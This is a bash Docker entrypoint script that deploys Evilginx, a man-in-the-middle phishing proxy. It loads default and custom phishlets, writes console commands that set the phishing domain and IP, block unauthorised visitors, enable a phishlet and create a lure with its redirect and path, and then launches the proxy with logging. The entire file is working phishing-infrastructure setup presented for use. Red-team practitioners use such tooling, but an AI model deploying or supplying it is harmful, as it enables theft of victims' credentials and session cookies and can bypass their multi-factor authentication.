#!/bin/bash
set -e

CONFIG_DIR="/root/.evilginx"
LOG_DIR="/app/logs"
SETUP_SCRIPT="${CONFIG_DIR}/setup.cfg"

mkdir -p "${LOG_DIR}"

# ---------------------------------------------------
# Generate a setup.cfg helper file from env vars.
# NOTE: Evilginx does NOT auto-execute this file — there is no
# such flag in v3.3.0 (-c/-p/-t/-debug/-developer/-v only).
# After the container is up, attach and source the commands:
#     docker attach evilginx
#     # paste contents of /root/.evilginx/setup.cfg
# ---------------------------------------------------
generate_config() {
    cat > "${SETUP_SCRIPT}" <<EOF
config domain ${BASE_DOMAIN}
config ipv4 ${SERVER_IP}
config redirect_url ${REDIRECT_URL}
blacklist unauth
EOF

    # Enable phishlet
    if [ -n "${PHISHLET_NAME}" ] && [ -n "${PHISHLET_HOSTNAME}" ]; then
        cat >> "${SETUP_SCRIPT}" <<EOF
phishlets hostname ${PHISHLET_NAME} ${PHISHLET_HOSTNAME}
phishlets enable ${PHISHLET_NAME}
EOF
    fi

    # Create lure
    if [ -n "${PHISHLET_NAME}" ]; then
        cat >> "${SETUP_SCRIPT}" <<EOF
lures create ${PHISHLET_NAME}
EOF
        if [ -n "${LURE_REDIRECT_URL}" ]; then
            echo "lures edit 0 redirect_url ${LURE_REDIRECT_URL}" >> "${SETUP_SCRIPT}"
        fi
        if [ -n "${LURE_PATH}" ]; then
            echo "lures edit 0 path ${LURE_PATH}" >> "${SETUP_SCRIPT}"
        fi
    fi

    echo "[*] Generated setup config:"
    cat "${SETUP_SCRIPT}"
}

# ---------------------------------------------------
# Merge default (upstream) + custom phishlets into the
# evilginx data dir. Customs are applied second so they
# override a bundled phishlet with the same filename.
# ---------------------------------------------------
setup_phishlets() {
    local default_count custom_count
    default_count=0
    custom_count=0

    if compgen -G "/app/phishlets-default/*.yaml" > /dev/null; then
        cp /app/phishlets-default/*.yaml "${CONFIG_DIR}/phishlets/" 2>/dev/null || true
        default_count=$(ls /app/phishlets-default/*.yaml 2>/dev/null | wc -l)
    fi
    echo "[*] Loaded ${default_count} default phishlet(s) from /app/phishlets-default"

    if compgen -G "/app/phishlets/*.yaml" > /dev/null; then
        cp /app/phishlets/*.yaml "${CONFIG_DIR}/phishlets/" 2>/dev/null || true
        custom_count=$(ls /app/phishlets/*.yaml 2>/dev/null | wc -l)
    fi
    echo "[*] Loaded ${custom_count} custom phishlet(s) from /app/phishlets (overrides)"
}

# ---------------------------------------------------
# Main
# ---------------------------------------------------
echo "==========================================="
echo " Evilginx Docker Infrastructure"
echo " Domain:   ${BASE_DOMAIN}"
echo " IP:       ${SERVER_IP}"
echo " Phishlet: ${PHISHLET_NAME}"
echo "==========================================="

mkdir -p "${CONFIG_DIR}/phishlets"
setup_phishlets
generate_config

echo "[*] Starting Evilginx..."
# -p points at the merged dir so Evilginx sees defaults + customs together.
exec evilginx -p "${CONFIG_DIR}/phishlets" -debug 2>&1 | tee "${LOG_DIR}/evilginx.log"
